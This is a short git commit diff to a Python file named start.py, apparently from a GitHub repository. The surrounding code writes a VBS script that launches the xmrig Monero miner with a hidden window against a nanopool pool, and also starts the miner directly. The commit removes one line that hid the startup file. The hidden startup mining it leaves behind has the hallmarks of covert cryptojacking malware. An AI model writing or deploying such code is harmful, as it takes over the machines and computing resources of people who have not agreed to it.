350baaf6684b277cc37fef6c0e615b681e4b3b74
Cr0mb <137664526+Cr0mb@users.noreply.github.com>
2025-02-25 10:47:17 -0600

    Update start.py

--- start.py
+++ start.py
@@ -51,9 +51,6 @@ if extracted_folders:
         vbs_file.write(f'''Set WshShell = CreateObject("WScript.Shell") 
     WshShell.Run """{xmrig_path}"" -o xmr-us-east1.nanopool.org:14433 -u {BITCOIN_ADDRESS} --tls --coin monero", 0, False
     ''')
-    
-    # Set the file as hidden (Windows only)
-    os.system(f'attrib +h "{STARTUP_PATH}"')
 
     subprocess.Popen(
         [xmrig_path, "-o", "xmr-us-east1.nanopool.org:14433", "-u", BITCOIN_ADDRESS, "--tls", "--coin", "monero"],
